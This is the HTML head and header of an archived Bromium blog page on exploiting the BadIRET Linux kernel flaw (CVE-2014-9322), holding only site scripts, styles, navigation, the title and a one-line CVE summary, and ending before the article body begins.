<!DOCTYPE html>
<!-- saved from url=(0150)https://web.archive.org/web/20171118232027/https://blogs.bromium.com/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/ -->
<html lang="en-US" prefix="og: http://ogp.me/ns#" class="wf-loading"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><script src="./2015 - Exploiting BadIRET vulnerability_files/analytics.js.下載" type="text/javascript"></script>
<script type="text/javascript">window.addEventListener('DOMContentLoaded',function(){var v=archive_analytics.values;v.service='wb';v.server_name='wwwb-app224.us.archive.org';v.server_ms=209;archive_analytics.send_pageview({});});</script>
<script type="text/javascript" src="./2015 - Exploiting BadIRET vulnerability_files/bundle-playback.js.下載" charset="utf-8"></script>
<script type="text/javascript" src="./2015 - Exploiting BadIRET vulnerability_files/wombat.js.下載" charset="utf-8"></script>
<script type="text/javascript">
  __wm.init("https://web.archive.org/web");
  __wm.wombat("https://blogs.bromium.com/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/","20171118232027","https://web.archive.org/","web","/_static/",
	      "1511047227");
</script>
<link rel="stylesheet" type="text/css" href="./2015 - Exploiting BadIRET vulnerability_files/banner-styles.css">
<link rel="stylesheet" type="text/css" href="./2015 - Exploiting BadIRET vulnerability_files/iconochive.css">
<!-- End Wayback Rewrite JS Include -->

	
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="pingback" href="https://blogs.bromium.com/xmlrpc.php">
	<script src="./2015 - Exploiting BadIRET vulnerability_files/pdu3jba.js.下載"></script>
	<style type="text/css">.tk-canada-type-gibson{font-family:"canada-type-gibson",sans-serif;}</style><style type="text/css">@font-face{font-family:canada-type-gibson;src:url(https://web.archive.org/web/20171118235202/https://use.typekit.net/af/fabc0b/0000000000000000000156a1/27/l?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&v=3) format("woff2"),url(https://web.archive.org/web/20171118235202/https://use.typekit.net/af/fabc0b/0000000000000000000156a1/27/d?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&v=3) format("woff"),url(https://web.archive.org/web/20171118235202/https://use.typekit.net/af/fabc0b/0000000000000000000156a1/27/a?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&v=3) format("opentype");font-weight:700;font-style:normal;}@font-face{font-family:canada-type-gibson;src:url(https://web.archive.org/web/20171118235202/https://use.typekit.net/af/30696c/0000000000000000000156a2/27/l?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=i7&v=3) format("woff2"),url(https://web.archive.org/web/20171118235202/https://use.typekit.net/af/30696c/0000000000000000000156a2/27/d?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=i7&v=3) format("woff"),url(https://web.archive.org/web/20171118235202/https://use.typekit.net/af/30696c/0000000000000000000156a2/27/a?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=i7&v=3) format("opentype");font-weight:700;font-style:italic;}@font-face{font-family:canada-type-gibson;src:url(https://web.archive.org/web/20171118235202/https://use.typekit.net/af/21be17/0000000000000000000156a0/27/l?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=i4&v=3) format("woff2"),url(https://web.archive.org/web/20171118235202/https://use.typekit.net/af/21be17/0000000000000000000156a0/27/d?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=i4&v=3) format("woff"),url(https://web.archive.org/web/20171118235202/https://use.typekit.net/af/21be17/0000000000000000000156a0/27/a?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=i4&v=3) format("opentype");font-weight:400;font-style:italic;}@font-face{font-family:canada-type-gibson;src:url(https://web.archive.org/web/20171118235202/https://use.typekit.net/af/e7160e/00000000000000000001569b/27/l?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n3&v=3) format("woff2"),url(https://web.archive.org/web/20171118235202/https://use.typekit.net/af/e7160e/00000000000000000001569b/27/d?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n3&v=3) format("woff"),url(https://web.archive.org/web/20171118235202/https://use.typekit.net/af/e7160e/00000000000000000001569b/27/a?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n3&v=3) format("opentype");font-weight:300;font-style:normal;}@font-face{font-family:canada-type-gibson;src:url(https://web.archive.org/web/20171118235202/https://use.typekit.net/af/706ffa/00000000000000000001569c/27/l?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=i3&v=3) format("woff2"),url(https://web.archive.org/web/20171118235202/https://use.typekit.net/af/706ffa/00000000000000000001569c/27/d?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=i3&v=3) format("woff"),url(https://web.archive.org/web/20171118235202/https://use.typekit.net/af/706ffa/00000000000000000001569c/27/a?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=i3&v=3) format("opentype");font-weight:300;font-style:italic;}@font-face{font-family:canada-type-gibson;src:url(https://web.archive.org/web/20171118235202/https://use.typekit.net/af/9a43ee/00000000000000000001569d/27/l?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n4&v=3) format("woff2"),url(https://web.archive.org/web/20171118235202/https://use.typekit.net/af/9a43ee/00000000000000000001569d/27/d?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n4&v=3) format("woff"),url(https://web.archive.org/web/20171118235202/https://use.typekit.net/af/9a43ee/00000000000000000001569d/27/a?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n4&v=3) format("opentype");font-weight:400;font-style:normal;}@font-face{font-family:canada-type-gibson;src:url(https://web.archive.org/web/20171118235202/https://use.typekit.net/af/4c111c/00000000000000000001569e/27/l?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n6&v=3) format("woff2"),url(https://web.archive.org/web/20171118235202/https://use.typekit.net/af/4c111c/00000000000000000001569e/27/d?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n6&v=3) format("woff"),url(https://web.archive.org/web/20171118235202/https://use.typekit.net/af/4c111c/00000000000000000001569e/27/a?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n6&v=3) format("opentype");font-weight:600;font-style:normal;}@font-face{font-family:canada-type-gibson;src:url(https://web.archive.org/web/20171118235202/https://use.typekit.net/af/5fc86c/00000000000000000001569f/27/l?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=i6&v=3) format("woff2"),url(https://web.archive.org/web/20171118235202/https://use.typekit.net/af/5fc86c/00000000000000000001569f/27/d?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=i6&v=3) format("woff"),url(https://web.archive.org/web/20171118235202/https://use.typekit.net/af/5fc86c/00000000000000000001569f/27/a?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=i6&v=3) format("opentype");font-weight:600;font-style:italic;}</style><script>try{Typekit.load({ async: false });}catch(e){}</script>
	<title>Exploiting "BadIRET" vulnerability (CVE-2014-9322, Linux kernel privilege escalation) - Bromium</title>

<!-- This site is optimized with the Yoast SEO plugin v5.6 - https://yoast.com/wordpress/plugins/seo/ -->
<link rel="canonical" href="https://web.archive.org/web/20171118232027/https://blogs.bromium.com/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/">
<meta property="og:locale" content="en_US">
<meta property="og:type" content="article">
<meta property="og:title" content="Exploiting &quot;BadIRET&quot; vulnerability (CVE-2014-9322, Linux kernel privilege escalation) - Bromium">
<meta property="og:description" content="Introduction CVE-2014-9322 is described as follows: arch/x86/kernel/entry_64.S in the Linux kernel before 3.17.5 does not properly handle faults associated with the Stack Segment (SS) segment register, which allows local users to gain privileges by triggering an IRET instruction that leads to access to a GS Base address from the wrong space. It was fixed on …">
<meta property="og:url" content="https://web.archive.org/web/20171118232027/https://blogs.bromium.com/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/">
<meta property="og:site_name" content="Bromium">
<meta property="article:publisher" content="https://www.facebook.com/bromium">
<meta property="article:section" content="Threats">
<meta property="article:published_time" content="2015-02-02T07:24:44-08:00">
<meta property="article:modified_time" content="2017-04-04T13:30:14-08:00">
<meta property="og:updated_time" content="2017-04-04T13:30:14-08:00">
<meta property="og:image" content="https://web.archive.org/web/20171118232027im_/https://blogs.bromium.com/wp-content/uploads/2015/02/Linux.png">
<meta property="og:image:secure_url" content="https://blogs.bromium.com/wp-content/uploads/2015/02/Linux.png">
<meta property="og:image:width" content="2000">
<meta property="og:image:height" content="2357">
<meta name="twitter:card" content="summary">
<meta name="twitter:description" content="Introduction CVE-2014-9322 is described as follows: arch/x86/kernel/entry_64.S in the Linux kernel before 3.17.5 does not properly handle faults associated with the Stack Segment (SS) segment register, which allows local users to gain privileges by triggering an IRET instruction that leads to access to a GS Base address from the wrong space. It was fixed on […]">
<meta name="twitter:title" content="Exploiting &quot;BadIRET&quot; vulnerability (CVE-2014-9322, Linux kernel privilege escalation) - Bromium">
<meta name="twitter:site" content="@bromium">
<meta name="twitter:image" content="https://web.archive.org/web/20171118232027im_/https://blogs.bromium.com/wp-content/uploads/2015/02/Linux.png">
<meta name="twitter:creator" content="@bromium">
<script type="application/ld+json">{"@context":"https:\/\/web.archive.org\/web\/20171118232027\/http:\/\/schema.org","@type":"WebSite","@id":"#website","url":"https:\/\/web.archive.org\/web\/20171118232027\/https:\/\/blogs.bromium.com\/","name":"Bromium","potentialAction":{"@type":"SearchAction","target":"https:\/\/web.archive.org\/web\/20171118232027\/https:\/\/blogs.bromium.com\/?s={search_term_string}","query-input":"required name=search_term_string"}}</script>
<script type="application/ld+json">{"@context":"https:\/\/web.archive.org\/web\/20171118232027\/http:\/\/schema.org","@type":"Organization","url":"https:\/\/web.archive.org\/web\/20171118232027\/https:\/\/blogs.bromium.com\/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation\/","sameAs":["https:\/\/web.archive.org\/web\/20171118232027\/https:\/\/www.facebook.com\/bromium","https:\/\/web.archive.org\/web\/20171118232027\/http:\/\/www.linkedin.com\/company\/bromium","https:\/\/web.archive.org\/web\/20171118232027\/https:\/\/twitter.com\/bromium"],"@id":"#organization","name":"Bromium","logo":"https:\/\/web.archive.org\/web\/20171118232027\/http:\/\/blogs.bromium.com\/wp-content\/uploads\/2017\/01\/cropped-Bromium-icon-1.png"}</script>
<!-- / Yoast SEO plugin. -->

<link rel="dns-prefetch" href="https://web.archive.org/web/20171118232027/https://s0.wp.com/">
<link rel="dns-prefetch" href="https://web.archive.org/web/20171118232027/https://s.w.org/">
<link rel="alternate" type="application/rss+xml" title="Bromium » Feed" href="https://web.archive.org/web/20171118232027/https://blogs.bromium.com/feed/">
<link rel="alternate" type="application/rss+xml" title="Bromium » Comments Feed" href="https://web.archive.org/web/20171118232027/https://blogs.bromium.com/comments/feed/">
<link rel="alternate" type="application/rss+xml" title="Bromium » Exploiting  “BadIRET” vulnerability (CVE-2014-9322, Linux kernel privilege escalation) Comments Feed" href="https://web.archive.org/web/20171118232027/https://blogs.bromium.com/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/feed/">
		<script type="text/javascript">
			window._wpemojiSettings = {"baseUrl":"https:\/\/web.archive.org\/web\/20171118232027\/https:\/\/s.w.org\/images\/core\/emoji\/2.3\/72x72\/","ext":".png","svgUrl":"https:\/\/web.archive.org\/web\/20171118232027\/https:\/\/s.w.org\/images\/core\/emoji\/2.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/web.archive.org\/web\/20171118232027\/https:\/\/blogs.bromium.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.8.3"}};
			!function(a,b,c){function d(a){var b,c,d,e,f=String.fromCharCode;if(!k||!k.fillText)return!1;switch(k.clearRect(0,0,j.width,j.height),k.textBaseline="top",k.font="600 32px Arial",a){case"flag":return k.fillText(f(55356,56826,55356,56819),0,0),b=j.toDataURL(),k.clearRect(0,0,j.width,j.height),k.fillText(f(55356,56826,8203,55356,56819),0,0),c=j.toDataURL(),b!==c&&(k.clearRect(0,0,j.width,j.height),k.fillText(f(55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447),0,0),b=j.toDataURL(),k.clearRect(0,0,j.width,j.height),k.fillText(f(55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447),0,0),c=j.toDataURL(),b!==c);case"emoji4":return k.fillText(f(55358,56794,8205,9794,65039),0,0),d=j.toDataURL(),k.clearRect(0,0,j.width,j.height),k.fillText(f(55358,56794,8203,9794,65039),0,0),e=j.toDataURL(),d!==e}return!1}function e(a){var c=b.createElement("script");c.src=a,c.defer=c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var f,g,h,i,j=b.createElement("canvas"),k=j.getContext&&j.getContext("2d");for(i=Array("flag","emoji4"),c.supports={everything:!0,everythingExceptFlag:!0},h=0;h<i.length;h++)c.supports[i[h]]=d(i[h]),c.supports.everything=c.supports.everything&&c.supports[i[h]],"flag"!==i[h]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[i[h]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(g=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",g,!1),a.addEventListener("load",g,!1)):(a.attachEvent("onload",g),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),f=c.source||{},f.concatemoji?e(f.concatemoji):f.wpemoji&&f.twemoji&&(e(f.twemoji),e(f.wpemoji)))}(window,document,window._wpemojiSettings);
		</script><script src="./2015 - Exploiting BadIRET vulnerability_files/wp-emoji-release.min.js.下載" type="text/javascript" defer=""></script>
		<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
<link rel="stylesheet" id="thickbox.css-css" href="./2015 - Exploiting BadIRET vulnerability_files/thickbox.css" type="text/css" media="all">
<link rel="stylesheet" id="dashicons-css" href="./2015 - Exploiting BadIRET vulnerability_files/dashicons.min.css" type="text/css" media="all">
<link rel="stylesheet" id="thickbox-css" href="./2015 - Exploiting BadIRET vulnerability_files/thickbox(1).css" type="text/css" media="all">
<link rel="stylesheet" id="noozbeat-google-font-css" href="./2015 - Exploiting BadIRET vulnerability_files/css" type="text/css" media="all">
<link rel="stylesheet" id="noozbeat-base-css" href="./2015 - Exploiting BadIRET vulnerability_files/base.css" type="text/css" media="all">
<link rel="stylesheet" id="flexslider-css" href="./2015 - Exploiting BadIRET vulnerability_files/flexslider.css" type="text/css" media="all">
<link rel="stylesheet" id="mmenu-css" href="./2015 - Exploiting BadIRET vulnerability_files/mmenu.css" type="text/css" media="all">
<link rel="stylesheet" id="font-awesome-css" href="./2015 - Exploiting BadIRET vulnerability_files/font-awesome.css" type="text/css" media="all">
<link rel="stylesheet" id="magnific-popup-css" href="./2015 - Exploiting BadIRET vulnerability_files/magnific.css" type="text/css" media="all">
<link rel="stylesheet" id="noozbeat-style-css" href="./2015 - Exploiting BadIRET vulnerability_files/style.css" type="text/css" media="all">
<link rel="stylesheet" id="noozbeat-style-child-css" href="./2015 - Exploiting BadIRET vulnerability_files/style(1).css" type="text/css" media="all">
<link rel="stylesheet" id="jetpack-authors-widget-css" href="./2015 - Exploiting BadIRET vulnerability_files/style(2).css" type="text/css" media="all">
<link rel="stylesheet" id="tablepress-default-css" href="./2015 - Exploiting BadIRET vulnerability_files/default.min.css" type="text/css" media="all">
<link rel="stylesheet" id="jetpack_css-css" href="./2015 - Exploiting BadIRET vulnerability_files/jetpack.css" type="text/css" media="all">
<script type="text/javascript" src="./2015 - Exploiting BadIRET vulnerability_files/jquery.js.下載"></script>
<script type="text/javascript" src="./2015 - Exploiting BadIRET vulnerability_files/jquery-migrate.min.js.下載"></script>
<script type="text/javascript">
/* <![CDATA[ */
var related_posts_js_options = {"post_heading":"h4"};
/* ]]> */
</script>
<script type="text/javascript" src="./2015 - Exploiting BadIRET vulnerability_files/related-posts.js.下載"></script>
<script type="text/javascript" src="./2015 - Exploiting BadIRET vulnerability_files/picturefill.min.js.下載"></script>
<script type="text/javascript" src="./2015 - Exploiting BadIRET vulnerability_files/calendar.js.下載"></script>
<script type="text/javascript" src="./2015 - Exploiting BadIRET vulnerability_files/calendar-setup.js.下載"></script>
<script type="text/javascript" src="./2015 - Exploiting BadIRET vulnerability_files/calendar_function.js.下載"></script>
<link rel="https://api.w.org/" href="https://blogs.bromium.com/wp-json/">
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://blogs.bromium.com/xmlrpc.php?rsd">
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://blogs.bromium.com/wp-includes/wlwmanifest.xml"> 
<link rel="shortlink" href="https://web.archive.org/web/20171118232027/https://wp.me/p8v7bX-a7">
<link rel="alternate" type="application/json+oembed" href="https://web.archive.org/web/20171118232027/https://blogs.bromium.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fblogs.bromium.com%2Fexploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation%2F">
<link rel="alternate" type="text/xml+oembed" href="https://web.archive.org/web/20171118232027/https://blogs.bromium.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fblogs.bromium.com%2Fexploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation%2F&amp;format=xml">
<!-- Marketo -->
<script type="text/javascript">
(function() {
  var didInit = false;
  function initMunchkin() {
    if(didInit === false) {
      didInit = true;
      Munchkin.init('497-ITQ-712');
    }
  }
  var s = document.createElement('script');
  s.type = 'text/javascript';
  s.async = true;
  s.src = '//web.archive.org/web/20171118232027/https://munchkin.marketo.net/munchkin.js';
  s.onreadystatechange = function() {
    if (this.readyState == 'complete' || this.readyState == 'loaded') {
      initMunchkin();
    }
  };
  s.onload = initMunchkin;
  document.getElementsByTagName('head')[0].appendChild(s);
})();
</script><script type="text/javascript" async="" src="./2015 - Exploiting BadIRET vulnerability_files/munchkin.js.下載"></script>

<!-- Plugin: Open external links a new window. Plugin by Kristian Risager Larsen, http://kristianrisagerlarsen.dk . Download it at http://wordpress.org/extend/plugins/open-external-links-in-a-new-window/ -->
<script type="text/javascript">//<![CDATA[
	function external_links_in_new_windows_loop() {
		if (!document.links) {
			document.links = document.getElementsByTagName('a');
		}
		var change_link = false;
		var force = '';
		var ignore = '';

		for (var t=0; t<document.links.length; t++) {
			var all_links = document.links[t];
			change_link = false;
			
			if(document.links[t].hasAttribute('onClick') == false) {
				// forced if the address starts with http (or also https), but does not link to the current domain
				if(all_links.href.search(/^http/) != -1 && all_links.href.search('blogs.bromium.com') == -1) {
					// alert('Changeda '+all_links.href);
					change_link = true;
				}
					
				if(force != '' && all_links.href.search(force) != -1) {
					// forced
					// alert('force '+all_links.href);
					change_link = true;
				}
				
				if(ignore != '' && all_links.href.search(ignore) != -1) {
					// alert('ignore '+all_links.href);
					// ignored
					change_link = false;
				}

				if(change_link == true) {
					// alert('Changed '+all_links.href);
					document.links[t].setAttribute('onClick', 'javascript:window.open(\''+all_links.href+'\'); return false;');
					document.links[t].removeAttribute('target');
				}
			}
		}
	}
	
	// Load
	function external_links_in_new_windows_load(func)
	{	
		var oldonload = window.onload;
		if (typeof window.onload != 'function'){
			window.onload = func;
		} else {
			window.onload = function(){
				oldonload();
				func();
			}
		}
	}

	external_links_in_new_windows_load(external_links_in_new_windows_loop);
	//]]></script>

  <script>
    var xx_cal_xx = '&';
  </script>
  
<link rel="dns-prefetch" href="https://web.archive.org/web/20171118232027/https://v0.wordpress.com/">
<link rel="dns-prefetch" href="https://web.archive.org/web/20171118232027/https://widgets.wp.com/">
<link rel="dns-prefetch" href="https://web.archive.org/web/20171118232027/https://s0.wp.com/">
<link rel="dns-prefetch" href="https://web.archive.org/web/20171118232027/https://0.gravatar.com/">
<link rel="dns-prefetch" href="https://web.archive.org/web/20171118232027/https://1.gravatar.com/">
<link rel="dns-prefetch" href="https://web.archive.org/web/20171118232027/https://2.gravatar.com/">
<style type="text/css">			.pre-head {
				background-color: #4b4f54;
			}
			</style><link rel="icon" href="https://web.archive.org/web/20171118232027im_/https://blogs.bromium.com/wp-content/uploads/2017/01/cropped-Bromium-icon-1-100x100.png" sizes="32x32">
<link rel="icon" href="https://web.archive.org/web/20171118232027im_/https://blogs.bromium.com/wp-content/uploads/2017/01/cropped-Bromium-icon-1-300x300.png" sizes="192x192">
<link rel="apple-touch-icon-precomposed" href="https://web.archive.org/web/20171118232027im_/https://blogs.bromium.com/wp-content/uploads/2017/01/cropped-Bromium-icon-1-300x300.png">
<meta name="msapplication-TileImage" content="https://blogs.bromium.com/wp-content/uploads/2017/01/cropped-Bromium-icon-1-300x300.png">
</head>
<body class="post-template-default single single-post postid-627 single-format-standard"><!-- BEGIN WAYBACK TOOLBAR INSERT -->
<style type="text/css">
body {
  margin-top:0 !important;
  padding-top:0 !important;
  /*min-width:800px !important;*/
}
</style>
<script>__wm.rw(0);</script>
<div id="wm-ipp-base" lang="en" style="display: block; direction: ltr;">
</div><div id="wm-ipp-print">The Wayback Machine - https://web.archive.org/web/20171118232027/https://blogs.bromium.com/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/</div>
<div id="donato" style="position: relative; width: 100%; height: 265px;">
  <div id="donato-base" style="height: 265px;">
    <iframe id="donato-if" src="./2015 - Exploiting BadIRET vulnerability_files/donate.html" scrolling="no" frameborder="0" style="width:100%; height:100%">
    </iframe>
  </div>
</div><script type="text/javascript">
__wm.bt(650,27,25,2,"web","https://blogs.bromium.com/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/","20171118232027",1996,"/_static/",["/_static/css/banner-styles.css?v=omkqRugM","/_static/css/iconochive.css?v=qtvMKcIJ"], false);
  __wm.rw(1);
</script>
<!-- END WAYBACK TOOLBAR INSERT -->

<div id="page">

<header class="header">
			<div class="pre-head">
			<div class="container">
				<div class="row">
					<div class="col-md-4 col-sm-5"></div>

					<div class="col-md-8 col-sm-7 text-right">
													<ul id="menu-super-nav" class="nav-pre-head list-inline"><li id="menu-item-2790" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2790"><a href="https://web.archive.org/web/20171118232027/http://www.bromium.com/">Bromium.com</a></li>
<li id="menu-item-2758" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2758"><a href="https://web.archive.org/web/20171118232027/https://blogs.bromium.com/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/#">Blog</a></li>
<li id="menu-item-2759" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2759"><a href="https://web.archive.org/web/20171118232027/https://www.bromium.com/company/news.html">News</a></li>
<li id="menu-item-2760" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2760"><a href="https://web.archive.org/web/20171118232027/https://www.bromium.com/company/events.html">Events</a></li>
<li id="menu-item-2761" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2761"><a href="https://web.archive.org/web/20171118232027/https://support.bromium.com/s/">Support</a></li>
<li id="menu-item-2762" class="supernav-button menu-item menu-item-type-custom menu-item-object-custom menu-item-2762"><a href="https://web.archive.org/web/20171118232027/http://learn.bromium.com/request-demo.html">Contact Us</a></li>
</ul>											</div>
				</div>
			</div>
		</div>
	
	<div class="mast-head">
		<div class="container">
			<div class="row">
				<div class="col-xs-12">
					<div class="head-wrap">
						<div class="head-wrap-col-left">
							<h1 class="site-logo">
								<a href="https://web.archive.org/web/20171118232027/https://www.bromium.com/">
																			<img src="./2015 - Exploiting BadIRET vulnerability_files/logo-bromium-web.svg" alt="Bromium">
																	</a>

							</h1>

															<p class="site-tagline"></p>
							
						</div>

						<div class="head-wrap-col-right">
										<div class="textwidget"><a href="https://web.archive.org/web/20171118232027/https://goo.gl/bJDdRC"><img src="./2015 - Exploiting BadIRET vulnerability_files/Blog-Take-the-test.jpg" alt="Take the Test"></a></div>
								</div>
					</div>

					<nav class="nav">
						<a href="https://web.archive.org/web/20171118232027/https://blogs.bromium.com/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/#mobilemenu" class="mobile-trigger"><i class="fa fa-navicon"></i> MENU</a>

						<ul id="menu-main-menu" class="navigation"><li id="menu-item-2837" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home menu-item-2837"><a href="https://web.archive.org/web/20171118232027/https://blogs.bromium.com/">Blog Home</a></li>
<li id="menu-item-2840" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-2840"><a href="https://web.archive.org/web/20171118232027/https://blogs.bromium.com/category/breakingnews/">Breaking News</a></li>
<li id="menu-item-2841" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-2841"><a href="https://web.archive.org/web/20171118232027/https://blogs.bromium.com/category/innovation/">Innovation</a></li>
<li id="menu-item-2839" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-2839"><a href="https://web.archive.org/web/20171118232027/https://blogs.bromium.com/category/threats/">Threats</a></li>
<li id="menu-item-2899" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-2899"><a href="https://web.archive.org/web/20171118232027/https://blogs.bromium.com/category/government/">Government</a></li>
<li id="menu-item-3034" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-3034"><a href="https://web.archive.org/web/20171118232027/https://blogs.bromium.com/category/end-users/">End Users</a></li>
<li id="menu-item-2842" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-2842"><a href="https://web.archive.org/web/20171118232027/https://blogs.bromium.com/category/compliance/">Compliance</a></li>
<li id="menu-item-2838" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-2838"><a href="https://web.archive.org/web/20171118232027/https://blogs.bromium.com/category/companynews/">Company News</a></li>
</ul>
						<form action="https://web.archive.org/web/20171118232027/https://blogs.bromium.com/" class="searchform" method="get" role="search">
	<div>
		<label class="screen-reader-text">Search for:</label>
		<input type="text" placeholder="Type and press enter" name="s" value="">
		<a class="btn searchsubmit"><i class="fa fa-search"></i></a>
	</div>
</form>
					</nav><!-- #nav -->

					<div id="mobilemenu"></div>
				</div>
			</div>
		</div>
	</div>
</header>



  	<div class="container breadcrumb-container">
		<div class="row">
			<div class="col-xs-12">
																</div>
		</div>
	</div>

  
  <main class="main">
  	<div class="container">
  		<div class="row">
  
  			  

<div class="col-xs-12">

	
	
		<div class="entry-head "> <!-- add the class .text-center for a centered article header -->
							<div class="entry-meta">
											<div class="entry-categories">
							<a href="https://web.archive.org/web/20171118232027/https://blogs.bromium.com/category/threats/" rel="tag">Threats</a>						</div>
					
											<time class="entry-time" datetime="2015-02-02T07:24:44+00:00">February 2, 2015</time>
									</div>
			
			<h2 class="entry-title">Exploiting  “BadIRET” vulnerability (CVE-2014-9322, Linux kernel privilege escalation)</h2>

			<div class="entry-submeta">
									<span>Author: <a href="https://web.archive.org/web/20171118232027/https://blogs.bromium.com/author/rafalwojtczuk/" title="Posts by Rafal Wojtczuk" rel="author">Rafal Wojtczuk</a></span>
													<span><a href="https://web.archive.org/web/20171118232027/https://blogs.bromium.com/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/#respond">No Comments</a></span>
									<span class="entry-share">Share:				<a target="_blank" class="icon-social" href="https://web.archive.org/web/20171118232027/https://www.facebook.com/sharer.php?u=https://blogs.bromium.com/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/"><i class="fa fa-facebook"></i></a>
		<a target="_blank" class="icon-social" href="https://web.archive.org/web/20171118232027/https://twitter.com/share?url=https://blogs.bromium.com/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/"><i class="fa fa-twitter"></i></a>
		<a target="_blank" class="icon-social" href="https://web.archive.org/web/20171118232027/https://plus.google.com/share?url=https://blogs.bromium.com/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/"><i class="fa fa-google-plus"></i></a>
		<a target="_blank" class="icon-social" href="https://web.archive.org/web/20171118232027/https://www.linkedin.com/shareArticle?url=https://blogs.bromium.com/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/"><i class="fa fa-linkedin"></i></a>
